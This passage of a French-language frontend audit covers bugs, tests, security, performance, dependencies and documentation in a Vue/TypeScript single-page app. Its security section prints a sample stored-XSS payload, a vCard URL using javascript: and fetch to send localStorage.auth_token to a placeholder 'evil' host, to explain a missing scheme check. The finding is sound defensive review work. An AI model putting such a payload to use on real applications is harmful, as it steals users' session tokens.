- **🟡 Jetons de thème dupliqués** — `createContext.ts:90-101` redéfinit en dur des couleurs qui existent aussi en CSS (`style.css`, variables `--bg`, `--text`…). Deux sources de vérité pour le design system. *Fix :* exposer les variables CSS aux apps plutôt que de coder les hex.

- **Points positifs** : `useFetchData`/`useApi`/`useConfirm` sont des composables propres et réutilisables. Les vues SFC sont organisées clairement. Le lazy-loading des apps (`load: () => import(...)`) et des vues de détail est bien fait. Le contrat `AppContext` (api/viewer/confirm/theme) est une abstraction soignée pour des apps pluggables.


## Phase 2 — Bugs / correctness

- **🟠 Rafraîchissement temps réel inopérant** — `DataBrowserView.vue:42-45` (et autres vues) s'abonnent via `onEntryChange(() => fetchEntries())`, mais le canal ne se connecte/n'émet jamais (cf. bugs backend Phase 2 + `auth.user` null Phase 1). Les listes ne se mettent pas à jour en direct ; il faut recharger manuellement. *Fix :* dépend de la réparation du canal côté back + réhydratation `auth.user`.

- **🟠 Erreurs avalées silencieusement (19 `catch {}` dans les vues)** — ex. `DataBrowserView.vue:127` (`saveEntry`), `:145` (`deleteEntry`), `:78` (`fetchEntries`). Cas concret : dans `saveEntry`, `JSON.parse(formData.value)` lève sur un JSON invalide → capturé en silence → la modale reste ouverte sans message, l'utilisateur croit à un bug. Aucune remontée d'erreur à l'UI. *Fix :* afficher les erreurs (toast/inline), au moins valider le JSON du formulaire avant envoi.

- **🟡 Fuite d'écouteur `keydown` (modale contacts)** — `contacts/index.ts:134-140`. Le listener `document.keydown` n'est retiré **que** si l'on ferme par Échap (`:137`) ; fermeture par Annuler (`:143`) ou clic sur l'overlay (`:130`) → `closeCreateModal` retire l'overlay mais **pas** le listener. `unmount` (`:581`) ne le retire pas non plus. Ouvertures/fermetures répétées → accumulation d'écouteurs. *Fix :* retirer `onKey` dans `closeCreateModal` et dans `unmount`.

- **🟡 `entries.list` charge jusqu'à 10 000 entrées** — `createContext.ts:48` (`per_page=10000`). Les apps (photos, contacts, calendar) récupèrent tout côté client puis filtrent/rendent en JS. Au-delà de quelques milliers d'items : payload lourd + rendu `innerHTML` complet coûteux (cf. Phase 5). *Fix :* pagination/chargement incrémental, ou filtrage côté serveur.

- **⚪ Ré-render complet perd l'état du DOM** — apps impératives : chaque changement d'état fait `el.innerHTML = …`, ce qui détruit focus/scroll/sélection. Contourné ponctuellement (re-focus de la recherche `contacts/index.ts:290`) mais fragile et incomplet ailleurs. *Fix :* migration en composants Vue (cf. Phase 1).

- **Points positifs** : les vues SFC (DataBrowser, etc.) utilisent les templates Vue (échappement automatique, réactivité correcte, `watch`/`computed` bien employés). La pagination, les filtres et le deep-link `?entry=` sont corrects.


## Phase 3 — Tests & couverture

- **🟠 Aucun test frontend** — pas de Vitest/Jest/Cypress/Playwright, pas de dépendance de test, pas de script `test`. 0 % de couverture. Les modules les plus complexes et les plus à risque (les 4 « apps » impératives, ~2500 LOC de manipulation DOM + concaténation HTML) ne sont pas testés — ce sont précisément ceux où se nichent les XSS (Phase 4) et les fuites (Phase 2).

- **🟡 Pas de test du flux d'auth ni du client API** — `stores/auth.ts`, `composables/useApi.ts`, gardes de route : non testés. Une régression sur le 401/logout ou le guard passerait inaperçue.

- **Filet de sécurité existant** : `strict: true` dans `tsconfig.app.json`/`tsconfig.node.json`, et `build` lance `vue-tsc -b` (type-check bloquant). C'est utile mais ne couvre que les types, pas le comportement.

- **Recommandation** : introduire **Vitest** + `@vue/test-utils` + `happy-dom` pour : (1) un helper de rendu testant l'échappement HTML des apps (anti-régression XSS) ; (2) le store `auth` (login/logout/401) ; (3) `useApi`. Optionnellement un smoke test E2E Playwright sur le login + navigation. Ajouter un script `"test": "vitest"`.


## Phase 4 — Sécurité

- **🟠 XSS stocké via le schéma d'URL d'un champ contact (`href`)** — `contacts/index.ts:396-397`. Le champ « Website » (`url`, issu d'un import vCard, donc contrôlable) est injecté dans `href="${escapeHtml(url)}"`. `escapeHtml` neutralise les chevrons/guillemets mais **pas le schéma** : un vCard contenant `URL:javascript:fetch('//evil/'+localStorage.auth_token)` produit `<a href="javascript:…">` → exécution au clic = vol du token. *Fix :* valider le schéma (n'autoriser que `http:`/`https:`/`mailto:`/`tel:`) avant de rendre tout `href` issu de données utilisateur.

- **🟠 Aucune Content-Security-Policy ni en-tête de sécurité** — ni dans le backend (`SpaController`/endpoint), ni en méta. Combiné à l'usage massif de `innerHTML` dans les apps, toute XSS (cf. ci-dessus) s'exécute sans contrainte et peut exfiltrer le token. *Fix :* ajouter une CSP stricte (au moins `default-src 'self'`, `script-src 'self'`) sur la réponse HTML du SPA. ⚠️ Les gestionnaires inline (`onerror=…` dans `photos/index.ts:217`) devront être retirés pour qu'une CSP sans `unsafe-inline` fonctionne.

- **🟡 Token JWT-like en `localStorage`** — `auth.ts:6,14`. Accessible en JS → volable par n'importe quelle XSS (cf. points ci-dessus). Compromis classique des SPA. *Fix (défense en profondeur) :* envisager un cookie `HttpOnly`+`SameSite` côté serveur, ou a minima réduire la surface XSS (échappement systématique + CSP).

- **🟡 Surface XSS large par conception** — `innerHTML` est utilisé ~17 fois dans les apps, chaque interpolation de donnée utilisateur dépendant d'un appel manuel à `escapeHtml`. L'audit n'a pas trouvé d'oubli d'échappement de **contenu** (bonne discipline), mais le risque de régression future est structurellement élevé. *Fix :* la migration en composants Vue (Phase 1) éliminerait la classe entière de bugs (échappement automatique des templates).

- **Points positifs** : les vues SFC échappent automatiquement (pas de `v-html` sur des données utilisateur — les `v-html` repérés ne portent que sur des SVG de logos **statiques** définis dans `connectors.ts`, donc sûrs). Le `escapeHtml` des apps est appliqué avec rigueur sur le contenu textuel. Gestion 401 → logout cohérente. `rel="noopener"` présent sur les liens externes (`contacts/index.ts:398`).


## Phase 5 — Performance

- **🟠 Chargement de toutes les entrées + ré-render DOM complet** — `createContext.ts:48` (`per_page=10000`) couplé au ré-render `el.innerHTML = …` des apps. Contacts/Photos chargent tout puis reconstruisent l'intégralité du sous-arbre DOM à chaque interaction (recherche, sélection, filtre). Sur de gros volumes : payload réseau lourd + jank de rendu. *Fix :* pagination/scroll infini côté serveur + rendu réactif granulaire (Vue) au lieu de reconstruire tout le HTML.

- **🟡 Avatars de contacts non lazy-loadés** — `contacts/index.ts:221,334`, `photos/index.ts:112`. Les `<img>` d'avatars (liste de contacts) n'ont pas `loading="lazy"` (une seule occurrence de lazy dans tout le front, sur la grille photos). Avec beaucoup de contacts à photo, toutes les images se chargent d'emblée. *Fix :* ajouter `loading="lazy"` aux `<img>` de listes.

- **⚪ Logos SVG inline dans le bundle principal** — `connectors.ts` (411 l., 13 logos). Embarqués dans le chunk principal, chargés même quand on ne visite pas Sources. Poids modéré. *Fix :* externaliser en fichiers `.svg` ou charger à la demande si le catalogue grandit.

- **⚪ Pas de configuration de chunking** — `vite.config.ts` minimal. Pas bloquant : Vite fait le tree-shaking/minification par défaut, et les apps + vues de détail sont déjà en `import()` dynamique (bons chunks séparés). *Fix :* optionnel, surveiller la taille du chunk vendor si besoin.

- **Points positifs** : lazy-loading des 4 apps et des vues de détail (code-splitting effectif). La grille photos utilise les **miniatures** générées côté serveur (`getThumbPath`) plutôt que les originaux — bonne pratique. Build de prod standard Vite (minif/tree-shaking).


## Phase 6 — Clean code

- **🟡 `escapeHtml` redéfini 4 fois** — un par app (`contacts`, `photos`, `files`, `calendar`). Helper de sécurité dupliqué → risque qu'une copie diverge. *Fix :* le factoriser dans un module partagé (`apps/escapeHtml.ts` ou un utilitaire commun).

- **🟡 Fichiers volumineux mêlant rendu, logique, état et HTML** — `apps/photos/index.ts` (934 l.), `ConnectorDetailView.vue` (860), `ContactDetailView.vue` (619), `DataBrowserView.vue` (600), `apps/contacts/index.ts` (588), `apps/calendar/index.ts` (570), `ConnectorsView.vue` (535). Les apps impératives sont particulièrement denses (génération de HTML par concaténation + binding manuel). *Fix :* découper en sous-composants/sous-modules ; la migration Vue (Phase 1) réduirait mécaniquement la taille.

- **🟡 Trois clients HTTP / jetons de thème dupliqués** *(repris de Phase 1)* — `useApi.ts`, `createContext.ts`, `auth.ts` ; couleurs en dur dans `createContext.ts` vs `style.css`. *Fix :* centraliser.

- **Points positifs** : discipline TypeScript excellente (`strict` activé, quasi aucun `as any` — une seule occurrence dans tout le code), aucun `TODO/FIXME/HACK` traînant, nommage clair, composables bien découpés, types partagés cohérents (`types.ts`, `apps/types.ts`). Les vues SFC sont lisibles et idiomatiques.


## Phase 7 — Dépendances

> `npm outdated` + `npm audit` exécutés. **3 vulnérabilités** (2 hautes, 1 modérée), toutes dans des dépendances **build-time/dev** (non embarquées dans le bundle de prod, qui n'est que du statique).

- **🟠 `vite` 8.0.0 — 2 advisories HIGH** — path traversal / lecture de fichier arbitraire via le **dev server** (WebSocket, gestion `.map`, bypass `server.fs.deny`). Exposition limitée à la machine de dev qui lance `vite`, mais réelle (un site malveillant ouvert pendant que le dev server tourne peut lire des fichiers). Correctif disponible : `npm audit fix` → `vite 8.0.16` (patch, sans rupture). *Fix :* appliquer.

- **🟡 `postcss` < 8.5.10 (modéré) + `launch-editor` (Windows/dev)** — transitives, build-time. Corrigées par le même `npm audit fix`. `launch-editor` ne concerne que Windows.

- **🟡 Mises à jour mineures sûres disponibles** (`Wanted`) — `vue 3.5.30→3.5.38`, `vite 8.0.0→8.0.16`, `vue-tsc 3.2.5→3.3.5`, `@vueuse/core`, `phoenix 1.8.5→1.8.8` (aligner avec le backend), `@vitejs/plugin-vue`. Toutes dans les contraintes `^` → `npm update` sans risque.

- **⚪ Majeures à planifier (ruptures potentielles)** — `vue-router 4→5`, `typescript 5.9→6`, `@types/node 24→26`. Hors contraintes actuelles ; à traiter séparément avec relecture du changelog.

- **⚪ Hygiène** : `package-lock.json` présent, dépendances de prod minimales et pertinentes (vue, pinia, vue-router, phoenix, @vueuse/core, flatpickr, lucide). Pas de dépendance runtime superflue évidente.


## Phase 8 — Documentation

- **🟡 `frontend/README.md` est le boilerplate Vite par défaut** — contenu générique « Vue 3 + TypeScript + Vite », rien de spécifique au projet. *Fix :* le remplacer par un court guide (scripts dev/build, proxy Vite, lien vers DEVELOPMENT.md) ou le supprimer.

- **🟡 Le système d'« apps » pluggables n'est pas documenté** — le contrat `AppModule`/`AppContext` (le point le plus original et non-évident du front) n'existe qu'en code (`apps/types.ts`). Aucune doc narrative sur « comment ajouter une app » (implémenter `mount/unmount`, l'enregistrer dans `registry.ts`, utiliser `ctx.api/viewer/confirm`). Vu l'ambition de modularité du projet, c'est la doc manquante la plus utile. *Fix :* un `apps/README.md` ou une section dans DEVELOPMENT.md.

- **⚪ JSDoc rare** — seul `useFetchData.ts` est commenté. Acceptable car les types TS documentent beaucoup, mais les apps impératives (logique dense) gagneraient à quelques commentaires d'intention.

- **Points positifs** : `DEVELOPMENT.md` (au niveau racine) couvre correctement le setup front (Vite, proxy, arborescence) et le contrat `AppContext` est bien typé/auto-documenté. Pas de dérive doc↔code majeure côté front (contrairement au back).

